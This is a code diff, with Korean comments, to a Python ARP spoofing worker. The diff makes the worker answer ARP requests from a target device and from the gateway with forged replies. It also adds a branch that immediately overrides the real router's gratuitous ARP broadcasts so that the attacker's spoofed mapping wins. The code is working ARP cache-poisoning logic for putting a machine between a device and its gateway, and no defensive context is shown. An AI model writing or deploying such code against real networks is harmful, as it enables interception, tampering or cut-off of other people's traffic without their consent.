@@ -136,10 +136,37 @@ class ArpSpoofWorker:
                     packet.pdst,
                 )
 
-            if packet.op != 1:  # who-has 요청만 상대한다
+            if packet.op == 1:
+                if packet.pdst == self.gateway_ip and packet.psrc == self.target.ip:
+                    # 대상 기기가 "게이트웨이 어디 있어?" 라고 물어봄 -> 즉시 답한다
+                    _send_arp_reply(
+                        dst_ip=self.target.ip,
+                        dst_mac=self.target.mac,
+                        spoofed_src_ip=self.gateway_ip,
+                        src_mac=self._my_mac,
+                    )
+                    logger.info(
+                        "ARP 요청 실시간 응답 (%s): 기기가 게이트웨이를 물어봐서 즉시 답변",
+                        self.target.name,
+                    )
+                elif packet.pdst == self.target.ip and packet.psrc == self.gateway_ip:
+                    # 게이트웨이가 "대상 기기 어디 있어?" 라고 물어봄 -> 즉시 답한다
+                    _send_arp_reply(
+                        dst_ip=self.gateway_ip,
+                        dst_mac=self._gateway_mac,
+                        spoofed_src_ip=self.target.ip,
+                        src_mac=self._my_mac,
+                    )
                 return
-            if packet.pdst == self.gateway_ip and packet.psrc == self.target.ip:
-                # 대상 기기가 "게이트웨이 어디 있어?" 라고 물어봄 -> 즉시 답한다
+
+            # op == 2 (is-at): 실제 공유기가 스스로 "내가 게이트웨이다"라고
+            # 광고(gratuitous ARP)하는 걸 목격하면, 그 즉시 우리도 다시
+            # 광고해서 덮어쓴다. 기기가 "누가 물어봤을 때만 답하는" 게 아니라
+            # "마지막으로 받은 광고를 그냥 믿는" 타입이면, 2초 주기로 도는
+            # 우리 광고보다 실제 공유기가 스스로 훨씬 자주(관찰된 사례는
+            # 60ms 간격) 광고해서 이겨버린다 — 공유기가 광고하는 순간마다
+            # 즉시 맞받아쳐서 "마지막 발언자"를 우리로 만드는 게 목적이다.
+            if packet.op == 2 and packet.psrc == self.gateway_ip:
                 _send_arp_reply(
                     dst_ip=self.target.ip,
                     dst_mac=self.target.mac,
@@ -147,16 +174,7 @@ class ArpSpoofWorker:
                     src_mac=self._my_mac,
                 )
                 logger.info(
-                    "ARP 요청 실시간 응답 (%s): 기기가 게이트웨이를 물어봐서 즉시 답변",
-                    self.target.name,
-                )
-            elif packet.pdst == self.target.ip and packet.psrc == self.gateway_ip:
-                # 게이트웨이가 "대상 기기 어디 있어?" 라고 물어봄 -> 즉시 답한다
-                _send_arp_reply(
-                    dst_ip=self.gateway_ip,
-                    dst_mac=self._gateway_mac,
-                    spoofed_src_ip=self.target.ip,
-                    src_mac=self._my_mac,
+                    "실제 게이트웨이 광고 감지 -> 즉시 재광고 (%s)", self.target.name
                 )
         except Exception as e:  # noqa: BLE001
             logger.warning("ARP 요청 실시간 응답 실패 (%s): %s", self.target.name, e)
